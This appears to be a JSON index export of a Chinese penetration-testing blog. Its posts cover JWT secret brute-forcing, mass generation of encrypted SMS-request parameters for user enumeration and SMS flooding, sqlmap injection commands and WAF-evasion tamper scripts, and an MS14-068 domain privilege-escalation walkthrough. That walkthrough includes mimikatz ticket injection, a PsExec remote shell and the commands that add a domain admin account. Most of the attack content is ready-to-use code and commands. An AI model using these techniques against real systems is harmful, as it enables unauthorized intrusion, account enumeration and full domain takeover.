{"pages":[{"title":"About","date":"2019-12-06T10:53:00.890Z","path":"about/index.html","text":""},{"title":"Categories","date":"2019-12-06T10:53:00.890Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2019-12-06T10:53:00.890Z","path":"tags/index.html","text":""}],"posts":[{"title":"JWT加密解密","date":"2020-11-18T07:56:48.000Z","path":"undefined/JWT加密解密/","text":"^.^不忘初心，方得始终。 加密123456def encode(): en = jwt.encode(&#123; \"exp\": 1605617752, \"username\": \"admin\" &#125;, 'secret', algorithm='HS256') print(en) 解密12345def decode(): en='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDU2MTc3NTIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aXttK1DEBeqNtS4Mj3a37elBat1tA2QTZ89O8z_BoQA' word=jwt.decode(en,'secret', algorithm='HS256') print(word) JWT秘钥爆破123456789101112131415161718192021222324def crack_key(): \"\"\"爆破jwt秘钥\"\"\" jwt_str = sys.argv[1] passwd = sys.argv[2] with open(passwd) as f: for line in f: key = line.strip() try: jwt.decode(jwt_str,verify=True,key=key) print(termcolor.colored(r\"[+]\",\"green\"),\"found key successfully--&gt;\",termcolor.colored(key,\"green\")) break except ( jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError ): print(r\"[+] found key successfully!!! --&gt;\",termcolor.colored(key,\"green\")) break except jwt.exceptions.InvalidSignatureError: print(r\"[+] try key --&gt;\", key,\",\"*10) continue else: print(r\"[+] Done! no key was found\\n\") 通过秘钥批量对json数据进行加密1写个数组用jwt.encode批量传json数据进行加密，暂时懒得写。 ##重要 1JWT加密私钥可能和前端AES/DES传输私钥是同一个","tags":[],"categories":[{"name":"WEB","slug":"WEB","permalink":"https://github.com/p1gz/p1gz.github.io/tree/master/categories/WEB/"}]},{"title":"JS加密批量生成用户名","date":"2019-12-06T11:55:03.028Z","path":"undefined/JS加密批量生成用户名/","text":"^.^不忘初心，方得始终。 数据包12345678910111213141516POST /XX/sendSmsVerificationCode HTTP/1.1Host: XXUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/jsonReferer: http://1Content-Length: 109Cookie: 1X-Forwarded-For: 127.0.0.1Connection: close&#123;\"phone\":\"solrcHptmECweVRCeJSxwQ==\",\"base64Str\":\"yGjUFVohaesfJJaiw31zmwW7T1rkZgTqqTZ395HVQWY=q\",\"code\":\"DJaf\"&#125; 经过分析发现获取验证码的数据包内phone参数和base64Str由JS算法生成，code为验证码可以重复使用。Phone生成调用的函数phoneEncrypt()base64Str生成调用的函数encrypt()code为前端输入的验证码调用JS生成大批量的phone和base64Str 1234let arr = ['13333333333','12222222222'];for (let i = 0, len = arr.length; i &lt; len; i++) &#123; console.log('手机号:'+arr[i]+'\\t'+'phone:'+phoneEncrypt(arr[i])+'\\t'+'base64Str:'+encrypt(arr[i]));&#125; 使用这些phone和base64Str对系统进行暴力破解，即可批量对不同用户发送获取验证码短信或者可以遍历出系统内存在的用户。","tags":[],"categories":[{"name":"web前端","slug":"web前端","permalink":"https://github.com/p1gz/p1gz.github.io/tree/master/categories/web前端/"}]},{"title":"sqlmap –prefix,–suffix","date":"2019-12-06T11:40:54.636Z","path":"undefined/sqlmap –prefix,–suffix/","text":"^.^不忘初心，方得始终。 sqlmap –prefix,–suffix12345678例如，代码中是这样调用数据库的：$query = \"SELECT * FROM users WHERE id=(’\" . $_GET[’id’] . \"’) LIMIT 0, 1\"; 这时你就需要–prefix和–suffix参数了：python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1\" -p id --prefix \"’)\" --suffix \"AND (’abc’=’abc\"这样执行的SQL语句变成：$query = \"SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1\"; 12例子：sqlmap.py -r C:\\Users\\samny\\Desktop\\22.txt --dbms oracle -p formids --prefix \")))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d\" --suffix \"order by (((1\"","tags":[],"categories":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://github.com/p1gz/p1gz.github.io/tree/master/categories/sqlmap/"}]},{"title":"sqlmap绕过脚本","date":"2019-12-06T10:35:56.512Z","path":"undefined/sqlmap绕过脚本/","text":"^.^不忘初心，方得始终。 sqlmap绕过脚本说明123456789101112131415161718192021222324252627282930313233apostrophemask.py 用utf8代替引号equaltolike.py like 代替等号space2dash.py 绕过过滤‘=’ 替换空格字符（”），（'' – '）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）greatest.py 绕过过滤’&gt;’ ,用GREATEST替换大于号。space2hash.py 空格替换为#号 随机字符串 以及换行符apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论space2morehash.py 空格替换为 #号 以及更多随机字符串 换行符appendnullbyte.py 在有效负荷结束位置加载零字节字符编码ifnull2ifisnull.py 绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’space2mssqlblank.py 空格替换为其它空符号base64encode.py 用base64编码替换space2mssqlhash.py 替换空格modsecurityversioned.py 过滤空格，包含完整的查询版本注释space2mysqlblank.py 空格替换其它空白符号(mysql)between.py 用between替换大于号（&gt;）space2mysqldash.py 替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）multiplespaces.py 围绕SQL关键字添加多个空格space2plus.py 用+替换空格bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为likenonrecursivereplacement.py 取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filtersspace2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾chardoubleencode.py 双url编码(不处理以编码的)unionalltounion.py 替换UNION ALL SELECT UNION SELECTcharencode.py url编码randomcase.py 随机大小写unmagicquotes.py 宽字符绕过 GPC addslashesrandomcomments.py 用/**/分割sql关键字charunicodeencode.py 字符串 unicode 编码securesphere.py 追加特制的字符串versionedmorekeywords.py 注释绕过space2comment.py Replaces space character (‘ ‘) with comments ‘/**/’","tags":[],"categories":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://github.com/p1gz/p1gz.github.io/tree/master/categories/sqlmap/"}]},{"title":"sqlmap常用参数","date":"2019-12-06T10:32:37.560Z","path":"undefined/sqlmap常用参数/","text":"^.^不忘初心，方得始终。 sqlmap常用参数123sqlmap.py -u http://xx?id=1 --dbs --random-agent --tamper=randomcase.py --threads=1 --level 2--force-ssl 强制使用https协议，可能是使用HSTSsqlmap.py -r C:\\Users\\msi-\\AppData\\Local\\Temp\\\\1483292667775.req --dbs --random-agent --tamper=randomcase.py --threads=1 --level 2 --ignore-code=500 参数说明123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179--start=1 --stop=5 --dump dump前五条数据 --dbms指定数据库类型--technique=指定注入类型--delay 1 延时--random-agent 使用随机选定的HTTP User - Agent头 --no-cast 榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换NULL结果--no-escape避免混淆，sqlmap使用char()编码逃逸的方法替换字符串--level 1-5级（默认1）--risk 1-4级（默认1无害）级别升高可造成数据被篡改等风险避免过多的错误请求被屏蔽 参数：--safe-url,--safe-freq二阶SQL注入 参数：--second-order从数据库服务器中读取文件 参数：--file-read把文件上传到数据库服务器中 参数：--file-write,--file-dest爬行网站URL 参数：--crawl非交互模式 参数：--batch测试WAF/IPS/IDS保护 参数：--identify-waf启发式判断注入 参数：--smart（有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。）-techniqueB：基于Boolean的盲注(Boolean based blind)Q：内联查询(Inline queries)T：基于时间的盲注(time based blind)U：基于联合查询(Union query based)E：基于错误(error based)S：栈查询(stack queries)Request（请求）： 这些选项可以用来指定如何连接到目标URL。 --data=DATA 通过POST发送的数据字符串 --cookie=COOKIE HTTP Cookie头 --cookie-urlencode URL 编码生成的cookie注入 --drop-set-cookie 忽略响应的Set - Cookie头信息 --user-agent=AGENT 指定 HTTP User - Agent头 --random-agent 使用随机选定的HTTP User - Agent头 --referer=REFERER 指定 HTTP Referer头 --headers=HEADERS 换行分开，加入其他的HTTP头 --auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM) --auth-cred=ACRED HTTP身份验证凭据（用户名:密码） --auth-cert=ACERT HTTP认证证书（key_file，cert_file） --proxy=PROXY 使用HTTP代理连接到目标URL --proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码） --ignore-proxy 忽略系统默认的HTTP代理 --delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒 --timeout=TIMEOUT 等待连接超时的时间（默认为30秒） --retries=RETRIES 连接超时后重新连接的时间（默认3） --scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式 --safe-url=SAFURL 在测试过程中经常访问的url地址 --safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL Optimization（优化）： 这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关 --predict-output 预测常见的查询输出 --keep-alive 使用持久的HTTP（S）连接 --null-connection 从没有实际的HTTP响应体中检索页面长度 --threads=THREADS 最大的HTTP（S）请求并发量（默认为1） Injection（注入）： 这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S） --dbms=DBMS 强制后端的DBMS为此值 --os=OS 强制后端的DBMS操作系统为这个值 --prefix=PREFIX 注入payload字符串前缀 --suffix=SUFFIX 注入payload字符串后缀 --tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）： 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 --level=LEVEL 执行测试的等级（1-5，默认为1） --risk=RISK 执行测试的风险（0-3，默认为1） --string=STRING 查询时有效时在页面匹配字符串 --regexp=REGEXP 查询时有效时在页面匹配正则表达式 --text-only 仅基于在文本内容比较网页 Techniques（技巧）： 这些选项可用于调整具体的SQL注入测试。 --technique=TECH SQL注入技术测试（默认BEUST） --time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） --union-cols=UCOLS 定列范围用于测试UNION查询注入 --union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹）： -f, --fingerprint 执行检查广泛的DBMS版本指纹 Enumeration（枚举）： 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己 的SQL语句。 -b, --banner 检索数据库管理系统的标识 --current-user 检索数据库管理系统当前用户 --current-db 检索数据库管理系统当前数据库 --is-dba 检测DBMS当前用户是否DBA --users 枚举数据库管理系统用户 --passwords 枚举数据库管理系统用户密码哈希 --privileges 枚举数据库管理系统用户的权限 --roles 枚举数据库管理系统用户的角色 --dbs 枚举数据库管理系统数据库 --tables 枚举的DBMS数据库中的表 --columns 枚举DBMS数据库表列 --dump 转储数据库管理系统的数据库中的表项 --dump-all 转储所有的DBMS数据库表中的条目 --search 搜索列（S），表（S）和/或数据库名称（S） -D DB 要进行枚举的数据库名 -T TBL 要进行枚举的数据库表 -C COL 要进行枚举的数据库列 -U USER 用来进行枚举的数据库用户 --exclude-sysdbs 枚举表时排除系统数据库 --start=LIMITSTART 第一个查询输出进入检索 --stop=LIMITSTOP 最后查询的输出进入检索 --first=FIRSTCHAR 第一个查询输出字的字符检索 --last=LASTCHAR 最后查询的输出字字符检索 --sql-query=QUERY 要执行的SQL语句 --sql-shell 提示交互式SQL的shell Brute force（蛮力）： 这些选项可以被用来运行蛮力检查。 --common-tables 检查存在共同表 --common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： 这些选项可以用来创建用户自定义函数。 --udf-inject 注入用户自定义函数 --shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）： 这些选项可以被用来访问后端数据库管理系统的底层文件系统。 --file-read=RFILE 从后端的数据库管理系统文件系统读取文件 --file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 --file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）： 这些选项可以用于访问后端数据库管理系统的底层操作系统。 --os-cmd=OSCMD 执行操作系统命令 --os-shell 交互式的操作系统的shell --os-pwn 获取一个OOB shell，meterpreter或VNC --os-smbrelay 一键获取一个OOB shell，meterpreter或VNC --os-bof 存储过程缓冲区溢出利用 --priv-esc 数据库进程用户权限提升 --msf-path=MSFPATH Metasploit Framework本地的安装路径 --tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问： 这些选项可以被用来访问后端数据库管理系统Windows注册表。 --reg-read 读一个Windows注册表项值 --reg-add 写一个Windows注册表项值数据 --reg-del 删除Windows注册表键值 --reg-key=REGKEY Windows注册表键 --reg-value=REGVAL Windows注册表项值 --reg-data=REGDATA Windows注册表键值数据 --reg-type=REGTYPE Windows注册表项值类型 General（一般）： 这些选项可以用来设置一些一般的工作参数。 -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中 -s SESSIONFILE 保存和恢复检索会话文件的所有数据 --flush-session 刷新当前目标的会话文件 --fresh-queries 忽略在会话文件中存储的查询结果 --eta 显示每个输出的预计到达时间 --update 更新SqlMap --save file保存选项到INI配置文件 --batch 从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）： --beep 发现SQL注入时提醒 --check-payload IDS对注入payloads的检测测试 --cleanup SqlMap具体的UDF和表清理DBMS --forms 对目标URL的解析和测试形式 --gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果 --page-rank Google dork结果显示网页排名（PR） --parse-errors 从响应页面解析数据库管理系统的错误消息 --replicate 复制转储的数据到一个sqlite3数据库 --tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址 --wizard 给初级用户的简单向导界面","tags":[],"categories":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://github.com/p1gz/p1gz.github.io/tree/master/categories/sqlmap/"}]},{"title":"域权限提升14-068","date":"2019-06-30T13:28:42.000Z","path":"undefined/域权限提升14-068/","text":"^.^不忘初心，方得始终。 域权限提升14-068MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测 1systeminfo |find \"3011780\" 1.当获取到一个权限之后，利用溢出或者其他办法尽量把权限提到最高 2.利用溢出加载mimikataz获取当前系统内的账号密码域信息 3.通过mimikatz抓取：123456789101112131415域提权的基本要求如下： 账号:zhangsan 密码:2wsx3edc@WSX#EDC 域:ADMINCC（net view /domain） 域管名字:（dsquery server） \"CN=WIN-YUKONG,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=admincc,DC=com\" 然后ping WIN-YUKONG得到全称WIN-yukong.admincc.com S-1-5-21-3151176444-1385148096-3760465446-1113（whoami /all） 用户名 SID ===================== ============================================= admincc\\administrator S-1-5-21-3151176444-1385148096-3760465446-500 以上提取出：123456域：ADMINCC 普通域账号：zhangsan 密码：2wsx3edc@WSX#EDC DNS：admincc.com SID：S-1-5-21-3151176444-1385148096-3760465446-1113 域管理全称：WIN-yukong.admincc.com 4.ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u zhangsan@admincc.com -s S-1-5-21-3151176444-1385148096-3760465446-1113 -d 192.168.10.3 -p 2wsx3edc@WSX#EDC https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 5.票据注入，需要高权限去操作，我把票据拷贝到本地，然后我用溢出添加了一个test用户，登陆后把票据拷入进去（我想着可能可以直接用psexec去操作不过好像也有点麻烦） mimikatz # kerberos::purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造， mimikatz # kerberos::list //查看当前机器凭证 mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中 因为是2003的机器所以没有注入成功 搞了台win7重新伪造下试试，在同一个段内不用加入域就成 查看下kerberos::list 最重要的一步要来了，在mimikataz窗口中输入exit，然后输入klist查看凭证 注意一定要在这个窗口只有这里才能看到票据缓存，其他窗口中的缓存看不到 6.获取交互式shell psexec PsExec.exe \\WIN-yukong.admincc.com cmd.exe 7.添加域管 net user testyuguan2 Aa123456 /add /domain net localgroup administrators testyuguan2 /add /domain 8.登录域管","tags":[],"categories":[{"name":"域相关","slug":"域相关","permalink":"https://github.com/p1gz/p1gz.github.io/tree/master/categories/域相关/"}]}]}